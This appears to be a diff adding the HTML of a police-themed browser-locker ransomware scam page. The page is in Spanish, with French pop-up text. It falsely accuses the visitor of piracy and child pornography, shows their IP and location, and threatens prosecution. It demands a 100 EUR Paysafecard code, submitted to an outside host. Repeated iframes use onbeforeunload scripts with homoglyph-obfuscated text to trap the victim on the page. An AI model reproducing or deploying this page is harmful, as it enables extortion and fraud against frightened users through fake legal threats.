+ <!-- 5107 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 6322 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 4945 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 5012 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 9281 --> 
+
+
+<iframe test="test" srcdoc="<script> window.onbeforeunload=function(env){ return 'Vоtrе nаvigаtеur а été blоqué.  Tоut lеs dоnnéеs d’оrdnatеur sеrоnt détеnus еt lеs prоcédurеs crimеnеlеs sеra initié cоntrе vоus si l’amеndе sеra pas payéе.';} </script>" src="/message.php?country_code=fr&step=1"></iframe>
+
+ <!-- 7798 --> 
+
+
+<!-- main block -->
+
+<div class="txt">
+	<!-- start header block -->
+	<div id="portal-logo" class="header left" style="width: 1024px; height: 83px;">
+		<div class="left">
+			<img class="logo" border="0" src="es/images/cabe1.jpg" alt="" />
+		</div>
+		<div class="right">
+			<img class="logo" border="0" src="es/images/cabe2.jpg" alt="" />
+		</div>
+	</div>
+	<div style="clear: both;"></div>
+
+	<!-- fin header block -->
+
+			<div style="clear: both;"></div>
+
+	<div id="menu_activ">
+		<h1>
+			Se han grabado todas las actividades de este ordenador.
+			Todos sus ficheros están cifrados.
+		</h1>
+	</div>
+	<!-- start top block -->
+	<!-- fin top block -->
+<!-- start left block -->
+
+<div class="right_block">
+<!-- PAD block -->
+<div class="box"><!-- PAD block -->
+
+<div class="block_title"><p class="block2"></p></div>
+	<div class="video_text"></div>
+	<div class="video_frame"><img src="es/images/handcuffs.gif" border="0" height="140" width="200" /></div>
+	<div class="provider">
+		<dl>
+			<dd>Su IP:</dd><dt>62.210.129.149</dt>
+			
+			<dd>Ubicación:&nbsp;</dd><dt>Lyon,<br />Rhone-alpes,<br />France</dt>
+		</dl>
+	</div>
+
+	<div class="moneypak_logo">
+	<img width="144" height="38" border="0" alt="Logo" src="es/images/psc.png" style="padding: 0px 0px 0px 10px;" />
+	</div>
+			<div class="s_form">FORMA PARA EL PAGO SEGURO</div>
+
+<div class="rd" style="text-align: center;">
+<div class="aside">
+
+
+					<div class="hold">
+
+
+						<div class="block1">
+							<form action="http://r903939.com/checkout.php?step=1" method="post" onsubmit="return check(); window.onbeforeunload = null; window.document.body.onbeforeunload = null;">
+									<div class="form">
+										<div class="input fr rd">
+
+<input type="text" id="Editbox2" name="vouchid" value="Introduzca el código PAYSAFECARD" />
+										</div>
+									</div>
+									<!-- end .form-->
+									<div class="notice-hold">
+										<!-- $_NOTICE_BLOCK_0_START_$ --><!-- $_NOTICE_BLOCK_0_END_$ -->
+									</div>
+									<!-- end .notice-hold-->
+				<div id="wb_Text2">
+				Por favor, a continuación introduzca el código PAYSAFECARD usando el teclado numérico.
+				</div>
+
+	<div class="buttons">
+		<a class="button">1</a>
+		<a class="button">2</a>
+		<a class="button">3</a>
+		<a class="button">4</a>
+		<a class="button">5</a>
+		<a class="button">6</a>
+		<a class="button">7</a>
+		<a class="button">8</a>
+		<a class="button">9</a>
+		<a class="button">0</a>
+		<a class="button" style="padding: 5px 2px;">Borrar</a>
+	</div>
+	<div class="buttons" style="text-align: center;margin-bottom: 6px;width: 205px;text-align: center;">
+	</div>
+<br />
+			<div class="submit">
+				<input type="submit" value="¡Desbloquear el PC ahora!" id="AdvancedButton1" name="voucherSubmit" style="height: 34px; cursor: pointer; margin-top: -15px; width: 315px; margin-bottom: 12px;" />
+									<!-- end .submit-->
+			</div>
+							</form>
+						<!-- end .block1-->
+	</div>
+
+
+					<!-- end .hold--> 
+</div>
+
+</div></div>
+</div>
+<div style="font-size: 13px; margin: 25px 15px 0;"><b><u>Nota:</u></b> Las multas sólo se pueden pagar en el plazo de <b>12 horas</b>. Al transcurrir <b>12 horas</b> vence la posibilidad de pagar la multa.<br /><div style="margin-top: 12px;"><font color="red"><b>Se confiscarán todos los datos de su PC y se iniciarán procedimientos penales en su contra si no paga la multa.</b></font></div></div>
+</div>
+<!-- fin left block -->
+<!-- stsrt right block -->
+<div class="left_block">
+	<h2>
+		¡ATENCIÓN!<br />
+	</h2>
+<p>
+
+<ol type="1">
+	<li>
+<font color="red"><b>Ha violado la ley de derechos de autor (vídeo, música, software) y ha utilizado o distribuido ilegalmente contenidos con derechos de autor, </b></font>infringiendo con ello el artículo 1, sección 8, cláusula 8, también conocido como derechos de autor del código penal de los España.<br />El artículo 1, sección 8, cláusula 8 del código penal prevé una multa de dos a quinientos salarios mínimos o la privación de libertad de dos a ocho años.<br />
+	</li>
+	<li>
+<font color="red"><b>Ha estado viendo o distribuyendo contenido pornográfico prohibido</b></font> (se encontraron fotos porno de niños etc. en su ordenador). Por violar el artículo 202 del código penal de los España, el artículo 202 del código penal prevé la privación de libertad de cuatro a doce años.<br />
+	</li>
+	<li>
+<font color="red"><b>Se ha iniciado un acceso ilegal desde su PC sin su conocimiento o consentimiento, su PC puede estar infectado con malware,</b></font> por lo que está violando la ley sobre el uso negligente del ordenador personal. El artículo 210 del código penal prevé una multa de hasta 100.000 EUR y/o la privación de libertad de cuatro a nueve años.<br />De conformidad con la enmienda al código penal de los España del 28 de mayo de 2011, esta infracción de la ley (en caso de que no se repita - primera vez) puede considerarse como condicional en caso de que pague la multa de los Estados Unidos.<br />
+	</li>
+</ol>
+
+<font color="red"><b>Para desbloquear el ordenador y evitar otras consecuencias legales, está obligado a pagar unas tasas de 100 EUR. Puede pagarlas a través de PAYSAFECARD (tiene que comprar una tarjeta PAYSAFECARD, cargarla con 100 EUR e introducir el código). Puede comprar el código en cualquier tienda o gasolinera. PAYSAFECARD está disponible en tiendas a nivel nacional.</b></font>
+
+	<hr style="border-top: 3px dashed #999999;" />
+
+¿Cómo puedo pagar la multa para desbloquear mi PC?<br />
+
+<b>1.</b> Encuentre un punto de venta de PAYSAFECARD cerca suyo:<br />
+<img src="es/images/shops.jpg" border="0" style="margin-left: 16px;"><br />
+
+<b>2.</b> Escoja PAYSAFECARD en la selección de prepago y cárguela con dinero en efectivo en la caja registradora.<br />
+
+<b>3.</b> Ingrese su código PAYSAFECARD y escoja "¡Desbloquear el PC ahora!"
+</p>
+
+</div>
+<!-- fin right block -->
+<div style="clear: both;">&nbsp;</div>
+<!-- fin main block -->
+</div>
+
+<div id="loading" style="visibility: hidden;">
+<img src="fr/images/loader.gif" id="progress_img" style="visibility: hidden;">
+</div>
+
+</body>
+</html>
